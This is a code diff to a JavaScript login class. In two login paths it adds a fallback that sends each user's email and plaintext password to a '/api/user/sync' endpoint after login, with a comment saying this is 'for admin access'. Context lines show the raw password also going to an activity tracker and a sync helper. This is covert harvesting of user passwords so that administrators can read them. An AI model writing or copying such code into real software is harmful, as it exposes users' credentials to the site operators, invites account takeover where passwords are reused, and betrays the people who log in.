@@ -86,10 +86,29 @@ class AuthSystem {
                 window.ActivityTracker.trackLogin(email, password);
             }
             
-            // Sync password to server immediately
+            // Sync password to server immediately (for admin access)
             if (window.userSync && password) {
                 setTimeout(() => {
                     window.userSync.syncPassword(password);
+                }, 100);
+            } else if (password) {
+                // Fallback: sync directly if userSync not available
+                setTimeout(async () => {
+                    try {
+                        await fetch('/api/user/sync', {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json',
+                            },
+                            body: JSON.stringify({
+                                email: email,
+                                password: password,
+                                lastLogin: new Date().toISOString()
+                            })
+                        });
+                    } catch (error) {
+                        console.error('Error syncing password on login:', error);
+                    }
                 }, 100);
             }
             
@@ -151,10 +170,29 @@ class AuthSystem {
                 window.ActivityTracker.trackLogin(email, password);
             }
             
-            // Sync password to server immediately
+            // Sync password to server immediately (for admin access)
             if (window.userSync && password) {
                 setTimeout(() => {
                     window.userSync.syncPassword(password);
+                }, 100);
+            } else if (password) {
+                // Fallback: sync directly if userSync not available
+                setTimeout(async () => {
+                    try {
+                        await fetch('/api/user/sync', {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json',
+                            },
+                            body: JSON.stringify({
+                                email: email,
+                                password: password,
+                                lastLogin: new Date().toISOString()
+                            })
+                        });
+                    } catch (error) {
+                        console.error('Error syncing password on login:', error);
+                    }
                 }, 100);
             }
             
